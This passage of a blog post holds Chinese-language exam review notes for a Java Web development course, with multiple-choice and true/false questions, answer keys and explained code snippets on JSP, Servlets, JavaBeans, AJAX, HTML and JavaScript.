good=(ArrayList) session. ① if(good==null)&#123; good=new ArrayList(); session. ② &#125;else&#123; String goods=request. ③ if(godd!=null)&#123; goods=new String(goods.getBytes(&quot;ISO-8859-1&quot;),&quot;gb2312&quot;); good.add( ④ ); &#125; &#125; %&gt; ① getAttribute(“good”); &#x2F;&#x2F;读取购物车 ② setAttribute(“good”,good) &#x2F;&#x2F;存入购物车，session对象 ③ getParameter(“good”) &#x2F;&#x2F;获取表单里文本框属性名 ④ goods &#x2F;&#x2F;将goods的值存入good对象 通过相关方法输出session对象的生存期限第一次访问当前web服务的参数如图所示，如果现在经过20秒第二次访问此页面，下面哪些参数会发生变化（）。 超过发呆时间，第二次访问页面，session的创建时间、ID、上一次请求时间都会发生变化 使用pageContext内置对象可以操作当前JSP页面的所有其他内置对象，现有如下代码段，请问页面最后输出的结果（）。 123456789101112131415161718&lt;% application.setAttribute(&quot;applicationKey&quot;, &quot;applicationKey&quot; ); String applicationValue=(String)pageContext.getAttribute(&quot;applicationKey&quot;,4); session.setAttribute(&quot;sessionKey&quot;, &quot;sessionKey&quot; ); String sessionValue=(String)pageContext.getAttribute(&quot;sessionKey&quot;,3); request.setAttribute(&quot;requestKey&quot;, &quot;requestKey&quot; ); String requestValue=(String)pageContext.getAttribute(&quot;requestKey&quot;,2); pageContext.setAttribute(&quot;pageKey&quot;, &quot;pageKey&quot; ); String pageValue=(String)pageContext.getAttribute(&quot;pageKey&quot;,1); pageContext.removeAttribute(&quot;requestKey&quot;,2); pageContext.removeAttribute(&quot;applicationKey&quot;,4); pageContext.setAttribute(&quot;applicationKey&quot;,&quot;Java Web&quot;,4); %&gt; 页面域的范围scope：&lt;%=pageContext.getAttributesScope(&quot;pageKey&quot;)%&gt;&lt;br&gt; 请求域的范围scope：&lt;%=pageContext.getAttributesScope(&quot;requestKey&quot;)%&gt;&lt;br&gt; 会话域的范围scope：&lt;%=pageContext.getAttributesScope(&quot;sessionKey&quot;)%&gt;&lt;br&gt; 应用域的范围scope：&lt;%=pageContext.getAttributesScope(&quot;applicationKey&quot;)%&gt;&lt;br&gt; 选项D： pageContext.removeAttribute(“requestKey“;,2); &#x2F;&#x2F;从scope范围2移除关键字 requestKey的属性对象，最终打印scope值为0。 pageContext.removeAttribute(“applicationKey“;,4); &#x2F;&#x2F;从scope范围4移除关键字为applicationKey的属性对象。 pageContext.setAttribute(“applicationKey”,”Java Web”,4); &#x2F;&#x2F;以K&#x2F;V对的方式存储scope范围域4属性对象值”Java Web”，最终打印scope值为4. 页面域的范围scope：1 请求域的范围scope：0 会话域的范围scope：3 应用域的范围scope：4 现在分别用页面域、会话域和应用域制作访问统计，现在用IE浏览器访问页面结果如图所示。请问现在用Chrome浏览器访问此页面后显示结果为（） 页面域访问统计：1 会话域访问统计：1 应用域访问统计：13 页面域（page scope），它的生命周期是指页面执行期间。存储在页面域的对象只能在它所在页面被访问，作用范围当前页面。相同或不同浏览器（用户）的计数变量不能共享，没有计数功能。 会话域（session scope），它的生命周期是指某个客户端与服务器所连接的时间。客户端在第1次访问服务器时创建会话，在会话过期或用户主动退出后，会话结束。存储在会话域中的对象在整个会话期间（可以包含多次请求）都可以被访问。不同浏览器（用户）的计数变量不能共享，只能计数同一浏览器（用户）的访问统计。 应用域（application scope），它的生命周期是指从服务器开始执行服务到服务器关闭为止。存储在应用域中的对象在整个应用程序运行期间可以被所有JSP和Servlet共享访问。可以计数所有访问本页面的浏览器（用户）数。 第九章 Servlet编程1-5：DACBB 6-10：CCADA 在Java Web中，Servlet程序需要在 web.xml 文件中配置。 在部署带有Servlet的Java Web程序时，（）不是必需的。 A. csses文件夹 ✅ B. WEB-INF文件夹 C. web.xml文件 D. classes文件夹 完整配置Servlet需要的标签 &lt;servlet&gt;&lt;/servlet&gt;和&lt;servlet-mapping&gt;&lt;/servlet-mapping&gt; 如果是整个应用程序共享的数据，则适合放在ServletContext 中成为属性。 HttpServlet定义在javax.servlet.http之中。 在web.xml中预先对Servlet进行初始化设置的代码如下： 1234&lt;int-param&gt;&lt;param-name&gt;myWord&lt;/param-name&gt;&lt;param-value&gt;hello&lt;/param-value&gt;&lt;/init-param&gt; 获取初始化参数String myWord=getInitParameter(“myWord”); 在Servlet中，HttpServletResponser ()方法用来把一个HTTP请求重定向到另外的URL。 A. redirectResponse() B. sendURL() C. sendRedirect() D. redirectURL() 给定一个Servlet的代码片段如下： 1234Public void doGet(HttpServletRequest request,HttpServletResponse response) throw ServletException,IOException&#123; out.println(“hi kitty!”); out.close();&#125; 运行该Servlet时输出“hi kitty!“，则应在此Servlet的两眼一下画线处填入的代码是（） A. PrintWriter out&#x3D;response.getWriter(); B. OutputStream out&#x3D;request.getOutputStream(); C. PrintWriter out&#x3D;request.getWriter(); D. OutputStream out&#x3D;response.getOutputStream(); 给定一个Servlet程序的代码片段如下： 123Public void doPost(HttpServletRequest request,HttpServletResponse response) throw ServletException,IOException&#123; Request.getSession().getAttribute(“A”); //第2行&#125; 假定第2行返回的对象引用不是null，那么这个对象存储在（）范围中。 A. page B. application C. request D. session 在web.xml中定义了以下内容： 12345678&lt;servlet&gt;&lt;servlet-name&gt;Goodbye&lt;/servlet-name&gt;&lt;servlet-class&gt;cc.openhome.LogutServlet&lt;/servlet-class&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt;&lt;servlet-name&gt;GoodBye&lt;/servlet-mapping&gt;&lt;url-pattern&gt;/goodbye&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 下列可以正确访问该Servlet URL的是（）。 A. &#x2F;goodBye B. &#x2F;goodbye.servlet C. &#x2F;LoguotServlet D. &#x2F;Goodbye 1-5：AAAAB 6-10：BBBA Servlet是一种运行在服务器端和客户端的Java应用程序，可以生成动态的Web页面，它属于客户和服务器响应的中间层。 A. × B. √ Servlet中的两个处理请求的方法是doGet()、doPost()。 A. √ B. × Servlet为每一个HttpSession对象分配的唯一标识符是SessionID。 A. √ B. × 在Servlet程序中Servlet对象消亡时调用的方法是close()。 A. × B. √ 在Servlet中主要HttpServletResponse类的重定向方法forward()实现重定向，使用RequestDispatcher类的转发方法sendRedirect()实现转发功能。 A. √ B. × web、xml文件中的两种类型的参数为全局参数、局部参数。 A. × B. √ Filter接口中最主要的方法是doFilter()。 A. × B. √ 实现Filter接口的类需要重写init()方法、close()方法、doFilter()方法。 A. √ B. × 过滤器的doFilter（）函数在Servlet之后被调用。 A. × B. √ 某个文件名为SecondServlet.java的servlet文件，在服务器部署映射，以下哪个url-pattern能够成功（）。 &lt;url-pattern&gt;/5.1&lt;/url-pattern&gt; servlet的url-pattern映射规则要以&#x2F;开头，&#x2F;*.java 属于扩展映射，&#x2F;和扩展映射同时使用会出现语法错误； &#x2F;5.1属于精确路径映射，可以部署成功。 下列Servlet方法中，（）方法在Servlet生命周期中，Servlet每请求一次它就会被调用一次。 service() init() 载入时被执行，且只执行一次，对servlet进行初始化 service() 请求服务，请求一次执行一次 destroy() 服务器关闭时被调用，且只执行一次，用来释放servlet所占资源 close()不属于servlet 生命周期方法 关于servlet使用JSP内置对象，现有部分代码如下，请问在客户端页面会显示什么内容（）。 123456789101112131415protected void doPost(HttpServletRequest request,HttpServletResponse response) throws ServletException, IOException &#123;response.setContentType(&quot;text/html;charset=gb2312&quot;);request.setCharacterEncoding(&quot;gb2312&quot;);out.println(&quot;五一&quot;);System.out.println(&quot;劳动节&quot;);response.getWriter().println(“快乐！”);&#125; 会编译错误 out.println(“五一“); &#x2F;&#x2F;out对象在servlet里使用需要先声明PrintWriter out = response.getWriter();否则会出现编译错误。 System.out.println(“劳动节“); &#x2F;&#x2F;在JSP和servlet都可以输出到客户端的控制台，不能输出到客户端页面。 response.getWriter().println(“快乐！”); &#x2F;&#x2F;在JSP和servlet都可以输出到客户端页面。 现有a.jsp、B.java和C.java文件，B.java文件获取客户端a.jsp的表单传值，并将获取到的值传递到C.java后正确显示在客户端页面，请补全代码（）。 b.java部分代码段如下： 123456789101112131415protected void doPost(HttpServletRequest request,HttpServletResponse response) throws ServletException, IOException &#123;request.setCharacterEncoding(&quot;gb2312&quot;);String b = request.getParameter(&quot;a&quot;);if (b.length() &gt; 0) &#123;① request.getRequestDispatch(&quot;C).forward(request,response);&#125;&#125; request.getRequestDispatcher(“C”).forward(request, response); &#x2F;&#x2F;转发，通过forward方法把当前页面的request对象里的数据转发到C页面，getRequestDispatcher(“C”)。 response.sendRedirect(“C”); &#x2F;&#x2F;重定向，无法从以前的request对象中获取用户提交的数据。 response.encodeRedirectURL(“C”); &#x2F;&#x2F;URL重写，数据有丢失无法获取。 forward(request, response); &#x2F;&#x2F;语法错误。 在web服务器test目录下有一客户端a.jsp文件，代码如下所示。在B.java文件设置字符过滤器，下面注解方式能使程序正常运行并解决中文乱码的为（）。 1234567891011&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=gb2312&quot;%&gt;&lt;form action=&quot;B&quot; method=&quot;post&quot;&gt;请输入学生信息的模糊资料：&lt;input type=&quot;text&quot; name=&quot;stuname&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; value=&quot;查询&quot;&gt;&lt;/form&gt; 123@WebFilter(filterName = &quot;setCharacterEncodingFilter&quot;,urlPatterns = &#123; &quot;/test/a.jsp&quot;&#125;, initParams = &#123;@WebInitParam(name = &quot;encoding&quot;, value = &quot;GBK&quot;)&#125;) urlPatterns &#x3D; { “&#x2F;test&#x2F;a.jsp” ; } &#x2F;&#x2F;精确匹配拦截服务器下test目录的a.jsp客户端请求。 value &#x3D; “GBK”; 与客户端charset&#x3D;gb2312编码兼容。 现在为Web服务器设置监听session中某个对象状态变化，下面能实现将session对象持久化到存储设备上的方法为（）。 1sessionWillPassivate(HttpSessionEvent se) HttpSession中对象的状态有：绑定→解除绑定，钝化→活化。 valueBound(HttpSessionBindingEvent event) &#x2F;&#x2F;绑定，当对象被放到session里时，执行此方法。 valueUnbound(HttpSessionBindingEvent event) &#x2F;&#x2F;解除绑定，当对象被从session里移除时，执行此方法。 sessionWillPassivate(HttpSessionEvent se) &#x2F;&#x2F;钝化，当session里的对象被钝化时，执行此方法。 sessionDidActivate(HttpSessionEvent se) &#x2F;&#x2F;活化，当对象被重新加载（活化）时，执行此方法。 第十章 JSP和JavaBean1-5：ABABB 6-10：AABBD 下列关于JavaBean的说法正确的是（）。 A. Java文件与Bean定义的类名可以不同，但是要区分字母大小写。 B. 在JSP文件中引用Bean其实就是用jsp:useBean语句。 C. 被引用的Bean文件的扩展名为.jsp。 D. Bean文件放在任何目录下都可以被引用。 JavaBean的属性必须声明为private，方法必须声明为（）访问类型。 A. private B. public t C. protec D. static JavaBean可以通过相关jsp动作指令进行调用。下面（）不是JavaBean可以使用的jsp动作指令。 A. jsp:setParameter B. jsp:useBean C. jsp:getProperty D. jsp:setProperty JSP页面通过（）识别Bean对象，可以在程序段中通过xx.method形式调用Bean中的set和get方法。 A. class B. id C. name D. classname （）作用范围将使Bean对象保存在服务器的内存空间中，在服务器关闭后被移除。 A. request B. application C. session D. page 对于（）作用范围的Bean，当客户离开这个页面时JSP引擎取消为客户的该页面分配的Bean，释放他所占的内存空间。 A. page B. request C. application D. session 关于JavaBean，下列叙述中不正确的是（）。 A. JavaBean和Servlet一样，在使用之前必须在项目的web.xml中注册。 B. JavaBean的类必须是具体的和公共的，并且具有无参数的构造器。 C. JavaBean属性和表单控件名称能很好地耦合，得到表单提交的参数。 **D.**JavaBean的类属性是私有的，要通过公共方法进行访问。 使用jsp:getProperty动作标记可以在JSP页面中得到Bean实例的属性值，并将其转换为（）类型的数据发送到客户端。 A. Classes B. String C. Object D. Double 在项目中已经建立了一个JavaBean，其类为bean.Student，该Bean具有name属性，则下面标签用法正确的是（）。 A. &lt;jsp:useBean id&#x3D;”student” class&#x3D;”Student” scope&#x3D;”session”&#x2F;&gt; B. &lt;jsp:useBean id&#x3D;”student” class&#x3D;”bean.student” scope&#x3D;”session”&gt; C. &lt;jsp:useBean id&#x3D;”student” class&#x3D;”Student” scope&#x3D;”session”&gt; D. &lt;jsp:getProperty name&#x3D;”name” property&#x3D;”student”&#x2F;&gt; 给定TheBean类，假设还没有创建TheBean类的实例，以下（）JSP标准动作语句能创建这个Bean的一个新实例，并把它存储在请求作用域。 A. &lt;jsp:takeBean id&#x3D;”myBean” type&#x3D;”com.example.TheBean”&#x2F;&gt; B. &lt;jsp:takeBean id&#x3D;”myBean” class&#x3D;”com.example.TheBean” scope&#x3D;”request”&#x2F;&gt; C. &lt;jsp:useBean id&#x3D;”myBean” type&#x3D;”com.example.TheBean”&#x2F;&gt; D. &lt;jsp:useBean id&#x3D;”myBean” class&#x3D;”com.example.TheBean” scope&#x3D;”request”&#x2F;&gt; 1-5：AABBB 6-10：ABAAA 在JavaBean中可以将控制逻辑、值、数据库访问和其他对象进行封装，并且可以被其他应用调用。 A. √ B. × avaBean支持两种组件，即可视化组件、非可视化组件。 A. √ B. × 在JSP中可以使用jsp:setProperty方法来设置JavaBean的属性，也可以使用 jsp:getProperty方法来获取JavaBean的值。 A. × B. √ JavaBean规定成员变量的读&#x2F;写通过setter()方法和getter()方法进行。 A. √ B. × 给Boolean类型设置属性使用is方法。 A. × B. √ JavaBean有4个scope，它们分别是application、page、session、request。 A. √ B. × 当scope&#x3D;application时，JavaBean对象可以被同一用户的所有页面认识。 A. √ B. × 当scope&#x3D;request时，JavaBean对象可以在通过forward方法跳转的目标页面中被认识。 A. √ B. × DAO的全称是Data Access Object，它专门负责对数据库的访问。 A. √ B. × 获取JavaBean的属性的两种方法是使用JSP表达式或程序段、使用“jsp:getProperty”动作。 A. √ B. × 以下代码定义了一个JavaBean类Student.java，请问哪些行没有遵循有关约定（）。 123456789101112131 package bean;2 private class Student &#123; ❌3 private String stuname;4 public String getstuname() &#123; ❌ 5 return stuname;&#125;6 public void setterStuname(String stuname) &#123; ❌7 this.stuname = stuname;&#125;&#125; 1.JavaBean应该是public类，且具有无参数的public构造方法。也可以定义带参数构造方法。 2.类的成员变量一般称为属性（property），对每个属性访问权限一般定义为private，属性名必须以小写字母开头。 3.每个属性通常定义两个public方法，一个是访问方法（getter），一个是修改方法（setter），使用它们访问和修改JavaBeans的属性值，对应的变量首字母必须大写。 第2行：public class Student{&#x2F;&#x2F;应该是public类。 第4行：public String getStuname(){&#x2F;&#x2F;访问方法getter对应的变量首字母必须大写。 第6行：public void setStuname(String stuname){&#x2F;&#x2F;修改方法setter，应该是setStuname(String stuname)。 如果已经在包bean里正确定义了一个JavaBean类Rose.java，通过以下JSP代码能不能正确访问bean，如果不能以下哪项修改是正确的（）。 12345678910111 &lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=gb2312&quot;%&gt;2 &lt;jsp:useBean id=&quot;rose&quot; type=&quot;bean.Rose&quot; scope=&quot;session&quot;/&gt;3 &lt;p&gt;矩形的长是：&lt;%=rose.getLength()%&gt;4 &lt;p&gt;矩形的宽是：&lt;%=rose.getWidth()%&gt;5 &lt;p&gt;矩形的面积是：&lt;%=rose.computerArea()%&gt;6 &lt;p&gt;矩形的周长是：&lt;%=rose.computerLength()%&gt; type属性必须保证bean实例存在，如果找到用rose指向它，如果找不到产生Instantiation异常，beanName&#x3D;”bean.Rose”;可以动态实例化。 第2行加入动作标记useBean属性beanName即可：。 不能访问bean，应该在第2行加入动作标记useBean属性；beanName = &quot;bean.Rose&quot; 下面语句与&lt;jsp:getProperty name=”tom” property=”jerry”/&gt;等价的是（） &lt;%out.print(tom.getJerry());%&gt; 关于jsp:setProperty和jsp:getProperty标记的描述以下正确的是（）。 这两个标记的name属性值必须与&lt;jsp:useBean&gt;标记的id属性值相对应 student.jsp文件代码如下，要使student一直存在于会话中，直到终止或被删除为止，请补全代码（）。 12345678910111213141516&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=gb2312&quot; %&gt; &lt;jsp:useBean id=&quot;student&quot; class=&quot;bean.Student&quot; scope=&quot; ___session______ &quot; /&gt; &lt;jsp:setProperty property=&quot;stuname&quot; name=&quot;student&quot; value=&quot;rose&quot; /&gt; &lt;html&gt; &lt;body&gt; 学生姓名： &lt;jsp:getProperty name=&quot;student&quot; property=&quot;stuname&quot; /&gt; &lt;/body&gt; &lt;/html&gt; page页面域，request请求域，session会话域，application应用域。 第十二章 AJAX入门1-5：DCDDB 6-10：CBCCB AJAX的英文全称是（）。 A. Asp+JavaScript+XML B. Asynchronous+Java+XML C. Asynchronous+JavaScript+XHTML D. Asynchronous+JavaScript+XML 下面关于AJAX的描述错误的是（）。 A. AJAX使用XHTML和CSS基于的标准表示技术。 B. AJAX使用XML和XSLT进行数据互换和操作。 C. AJAX是一个新技术。 D. AJAX使用XMLHttpRequest获取数据。 AJAX模式中，客户端的请求是（）完成的。 A. 单向 B. 并发 C. 同步 D. 异步 以下关于AJAX优势和劣势的描述，说法错误的是（）。 A. 应用仅由少量页面组成，大部分交互在页面之内完成，不需要切换整个页面。 B. 按需获取数据，每次只从服务器端获取需要的数据。 C. 改善表单验证方式，不再需要打开新页面，也不再需要整个页面数据提交。 D. AJAX可以取代传统的Web应用开发。 使用AJAX技术编写Web应用程序，其使用（）格式实现数据的传递。 A. HTML B. XML C. XHTML D. TXT XMLHttpRequest对象的readyState属性值为（），代表请求成功接收数据完毕。 A. 3 B. 1 C. 4 D. 2 在创建请求的代码片段xmlhttp.open(“get”,”info.jsp?a&#x3D;1)中，传递的参数值为（）。 A. a B. 1 C. info.jsp D. get onreadystatechange事件在（）选项中发生变化时触发。 A. onchange B. readystatus C. readyState D. onfocus 在Firefox浏览器上创建XMLHttpRequest对象的方法是（）。 A. var xmlHttp&#x3D;new ActiveXObject(“Msxml2.XMLHTTP”); B. var xmlHttp&#x3D;new ActiveXObject(“Microsoft.XMLHTTP”); C. var xmlHttp&#x3D;new XMLHttpRequest(); D. 以上都不对。 Java是整个AJAX的核心部分，它使开发人员能够运用编程语言来控制浏览器端的行为。 A. √ B. × AJAX技术包括异步数据获取技术、基于标准的表示技术、动态显示和交互技术、数据互换和操作技术、Java。 A. × AJAX中open()方法的参数的含义分别是请求方式、请求目标、异步或同步。 A. √ AJAX中open()方法的第3个参数为false，表示异步请求。 B. × readyState属性的状态有0：未初始化状态；1：已初始化状态；2：发送数据状态；3：数据传送中状态；4：完成状态. B. √ 当xmlHttp状态改变时需要进行的处理一般以响应函数形式进行。 A. √ xmlHttp除了有responseText属性外，还有一个属性innerText，含义是表示在该div内显示内容时，不考虑其HTML格式的标签，即：将内容原样显示。 A. × 当xmlHttp.open()函数中的请求方式为put时，send()函数可以没有参数。 A. × 用来监听readState的方法是onreadystatechange() B. √ 关于AJAX技术相关特点，描述正确的是（）。 可以促进页面呈现和数据本身分离 减轻服务器负担，避免整个浏览器窗口刷新时造成的重复请求。 对浏览器具有一定的限制，对于不兼容的浏览器，可能无法使用。 AJAX没有刷新页面，浏览器上的“后退”按钮是失效的，不能退回。 现有以下部分JS代码段，用户使用IE5浏览器能否实现异步免刷新网页，如果不能应该如何修改（）。 1234567891011121 &lt;SCRIPT LANGUAGE=&quot;JavaScript&quot;&gt;2 function showInfo()&#123;3 var xmlHttp=new XMLHttpRequest(); 4 xmlHttp.open(&quot;POST&quot;, &quot;a.jsp&quot;, true); 5 xmlHttp.onreadystatechange=function() &#123; 6 if (xmlHttp.readyState==4) &#123; 7 infoDiv.innerHTML = xmlHttp.responseText;8 &#125;9 &#125;10 xmlHttp.send(); 11 &#125;12 &lt;/SCRIPT&gt; 不能实现异步免刷新网页，第三行改为 1var xmlhttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;) 所有现代浏览器（IE7+、Firefox、Chrome、Safari 以及 Opera）均支持XMLHttpRequest 对象var xmlHttp&#x3D;new XMLHttpRequest(); 老版本的Internet Explorer（IE5 和 IE6）使用ActiveXObject对象, var xmlhttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;) 部分分析HTTP请求和响应的服务器状态JS代码如下，当处于初始化状态时在客户端页面上打印的readyState属性值为（）。 不会有打印数据 123456789101112131415161718192021&lt;SCRIPT LANGUAGE=&quot;JavaScript&quot;&gt; var xmlHttp = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;); function showInfo() &#123; xmlHttp.open(&quot;GET&quot;, &quot;c.jsp&quot;, true); xmlHttp.onreadystatechange = showState; xmlHttp.send(); &#125; function showState() &#123; document.writeln(xmlHttp.readyState); &#125;&lt;/SCRIPT&gt; 服务器在初始化状态时还没有和客户端建立连接，无法收到客户端Http请求，所以不会执行showState函数，不会有打印数据在客户端页面。 使用AJAX技术跳转到a.jsp页面部分代码段如下，服务器响应返回客户端的代码为infoDiv.innerText &#x3D; xmlHttp.responseText;请问最后客户端页面输出内容为（）。 1234567891011a.jsp&lt;table&gt; &lt;tr&gt; &lt;th&gt;地址：&lt;br&gt;成都理工大学&lt;/th&gt; &lt;/tr&gt;&lt;/table&gt; 输出内容为 123456789&lt;table&gt; &lt;tr&gt; &lt;th&gt;地址：&lt;br&gt;成都理工大学&lt;/th&gt; &lt;/tr&gt;&lt;/table&gt; infoDiv.innerText属性，表示在该div内显示内容时，不考虑其中的HTML格式的标签，所有标签都不会解释并原样输出。 部分JSON代码如下，请问在客户端弹出窗口输出的内容依次为（）。 123456789101112131415161718192021222324252627function opJSON()&#123;var stu = &#123;&quot;sno&quot;:&quot;20190101&quot;,&quot;sname&quot;:&quot;Tom&quot;,&quot;hobby&quot;:[&quot;篮球&quot;,&quot;足球&quot;,”排球”],&quot;college&quot;:&#123;&quot;cname&quot;:&quot;成都理工大学&quot;,&quot;city&quot;:&quot;成都&quot;&#125;&#125;;alert(stu.sname);alert(stu.hobby[3]);alert(stu.college.city);&#125; 输出：Tomundefined成都 数组从0开始，hobby[3]是没有的，因为篮球足球排球是012","categories":[{"name":"期末考试","slug":"期末考试","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"},{"name":"WEB应用开发","slug":"期末考试/WEB应用开发","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/WEB%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"考点","slug":"考点","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"WEB mooc题","slug":"WEB-mooc题","date":"2021-06-22T11:36:56.000Z","updated":"2024-11-12T06:59:05.000Z","comments":true,"path":"2021/06/22/WEB-mooc题/","permalink":"https://gryffinbit.top/2021/06/22/WEB-mooc%E9%A2%98/","excerpt":"","text":"第一章 JSP规范唯一支持的语言是 Java 可以通过修改Tomcat的配置文件进行修改参数，下面的server.xml文件部分代码中，端口号是多少（） 12345&lt;Connector port=”8443” protocol=”HTTP/1.1”connectionTimeout=”8080”redirectPort=”8888”/&gt; A. 8443 ✅ B. 8888 C. 8080 D. 1.1 在Eclipse中，一个Web应用程序的部署描述文件位于（ ）目录。 A. WebRoot B. META-INF C. src D. WEB-INF ✅ web.xml 是web应用的配置文件，不能删除或随意修改，位于WEB-INF目录根目录下 关于下面这个URL说法正确的是（） http://localhost:8080/Prj01/index.jsp A. http是主机地址 B. localhost是协议 C. 8080是主机IP地址 D. prj01是主机资源目录 ✅ http是协议 localhost是主机IP地址或域名 8080是端口号 prj01&#x2F;index.jsp是主机资源具体地址，如目录和文件名等 当用户请求JSP页面时，JSP引擎会执行该页面的字节码文件响应客户的请求，执行字节码文件的结果是（） A. 发送一个HTML页面到客户端面 ✅ B. 什么都不做 C. 发送一个Java文件到客户端 D. 发送一个JSP源文件到客户端 第二章 在html标签中要设置字体的样式需要使用的属性为 Size Font face ✅ color 要用的标签是 font，要用的他的face属性 要将两段文字Java和Web设置在同一行显示，可以使用: 1&lt;h7&gt;Java&lt;/h7&gt;&lt;h8&gt;Web&lt;/h8&gt; 标题标签只有1-6，超过范围的都会以默认字体、字号显示，并且没有换行 现有部分html代码如下: 1234567&lt;ol type=&quot;A&quot;&gt; &lt;li&gt;Java&lt;/li&gt; &lt;li&gt;Web&lt;/li&gt;&lt;/ol&gt; 请问这段代码在浏览器上显示结果是（ A.JavaB.Web ） type属性值为a时会显示有序序号a、b、c…type属性值为A时会显示有序序号A、B、C….type属性值为其他值时，会显示默认有序序号1、2、3、4…. 在table标签里，要合并一列的3个单元格需要使用哪个属性值 12td.rowspan=&quot;3&quot; //行 td.colsapn=&quot;3&quot; //列 现有部分关于单选按钮的Html代码： 1234&lt;input type=&quot;radio&quot; name=&quot;1&quot; checked&gt;男 &lt;input type=&quot;radio&quot; name=&quot;2&quot; checked&gt;女&lt;BR&gt; 在浏览器上显示的效果是（ “男”和“女”都会被默认选中 ） 两个单选按钮的name属性值不一样，说明他们分别是两组单选按钮，所以会被全部选中 第三章 以下哪些JavaScript变量的命名是错误的？ (1)var hello; (2)var Java; (3)var 123; (4)var x%x; (5)var $hello; (6)var _Script; (7)var for; 命名规范： 首位字符必须是字母A-Z，a-z，_ ，$。 其他位置上可以是 _ , $ , 0-9 , a-z ， A-Z 关键字不能命名： for 现有如下计时器代码，要让计时器正确的显示在文本框里，请补全缺失部分。（） 12345678910111213141516&lt;html&gt;&lt;body&gt; &lt;input type=&quot;text&quot; id=&quot;count&quot; /&gt; &lt;script type=&quot;text/javascript&quot;&gt; var num = 0; function startCount() &#123; document.getElementByld(&quot;count&quot;).value = num; ------------ num += 1; setTimeout(startCount, 1000); &#125; setTimeout(startCount, 1000); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; alert(num) 显示在弹出的消息框里， window.status&#x3D;num 显示在浏览器窗口的状态栏里， getElementByld(“count”).value &#x3D; num 少了对象名会出错 document.getElementByld(“count”).value &#x3D; num 将num附值给ID为count的文本的属性值value history对象的 （ go(-1) ） 方法要求窗口显示刚刚访问的前一个页面 history.back() 返回上一页 history.forward() 返回下一页 history.go(n) 如果n是正数前进n格，负数表示向后退n格 在JavaScript内置对象中，不能实现在当前页面跳转的代码是(window.open) window.open()在新窗口跳转 可以在当前页面跳转的有window.location.href , location.href , this.location.href , self.location.href , window.location.replace 下面代码可以实现在页面显示如图九九乘法表，请补全代码。 123456789101112131415161718&lt;html&gt;&lt;head&gt; &lt;title&gt;九九乘法表&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; for (var i = 1; i &lt;= 9; i++) &#123; for (var j = 1; j &lt;= i; j++) &#123; a = i + &quot;*&quot; + j + &quot;=&quot; + i * j + &quot; &quot; **document.write(a)** ___________________ &#125; **document.write(&quot;&lt;br&gt;&quot;);** _________________ &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; alert() 是在弹出的消息框显示内容 console.log()是在控制台显示内容 window.status()是在浏览器窗口的状态栏显示内容 document.write()可以在页面显示内容 第四章 用户可以在（ “&lt;jsp: 和 /&gt;” ） 标记之间插入动作 在“&lt;%!”和“%&gt;”标记之间声明的Java方法称为页面的成员方法，其（ 在整个页面内 ）有效。 在Java声明标记的声明的变量、方法在整个页面内有效 在程序段里声明的变量是局部变量，从定义之后有效 现有如下JSP代码片段。 123456&lt;%!int n=0;%&gt;&lt;% int m=0; (1); out.print(&quot;欢迎访问本网站！&lt;br&gt;&quot;); out.print(&quot;您是第&quot;+ (2) +&quot;个访问本站的客户。&quot;);%&gt; 要实现网络计数器的功能，请补全代码。 (1) n++ (2)n n是全局变量，m是局部变量，所以用全部变量进行累加 现有以下jsp代码片段。 123&lt;% String str=&quot;12&quot;; int number=Integer.parseInt(str); %&gt;该数字的平方为：&lt;%=number*number %&gt;&lt;HR&gt;&lt;a href=&quot;4.6urlP2.jsp?number=______&quot;&gt;到达p2&lt;/a&gt; 请问空格处填以下哪个代码可以用url传值? &lt;%=str+1%&gt; url传值只能传字符串， 运算表达式会语法错误，比如 24+3 &lt;%=str+number%&gt; 两个不同类型变量的值，语法错误 str 是变量无法传值 str是字符串拼接，不是进行计算 现有以下jsp代码片段。 123&lt;% String str=&quot;12&quot;; int number=Integer.parseInt(str); %&gt;该数字的平方为：&lt;%=number*number %&gt;&lt;HR&gt;&lt;a href=&quot;4.6urlP2.jsp?number=&lt;%=str+6%&gt;&quot;&gt;到达p2&lt;/a&gt; 请问能不能用url传值到4.6urlP2.jsp?如果能传的值是多少？ 126 是直接进行了一个拼接 现有如下JSP代码片段，用来计算矩形的面积。 123456789101112131415&lt;% int row=Integer.parseInt(request.getParameter(&quot;&lt;tr&gt;&quot;));int col = Integer.parseInt(request.getParameter(&quot;&lt;td&gt;&quot;));out.print(&quot;&lt;table border=1&gt;&quot;);for(int i = 1; i &lt;= row; i++)&#123; out.print(&quot;&lt;tr&gt;&quot;); for(int j = 1; j &lt;= col; j++)&#123; out.print(&quot;&lt;td&gt;&quot;); out.print(i*j); out.print(&quot;&lt;/td&gt;&quot;); &#125; out.print(&quot;&lt;/tr&gt;&quot;);&#125;out.print(&quot;&lt;/table&gt;&quot;);%&gt; 现在用jsp:param动作“名字-值”来为矩形的长和宽传递参数，请问传值的“名字”应该为（）。 &lt;tr&gt;和&lt;td&gt; 第五章 现有文件名为charCode.jsp源代码，请问文件运行后能不能传值到指定页面，如果不能请找出错误代码。（） 12345678910111213141516&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=gb2312&quot;%&gt;&lt;html&gt; &lt;body&gt; &lt;form acton=&quot;charCode.jsp&quot;&gt; 请您输入鲜花的模糊资料：&lt;BR&gt; &lt;input type=&quot;hidden&quot; name=&quot;flower&quot; type=&quot;text&quot;&gt; &lt;input type=&quot;button&quot; value=&quot;查询&quot;&gt; ❌ &lt;/form&gt;&lt;% String flower = request.getParameter(&quot;flower&quot;);if(flower!=null)&#123; out.println(&quot;花朵名称为：&quot; + 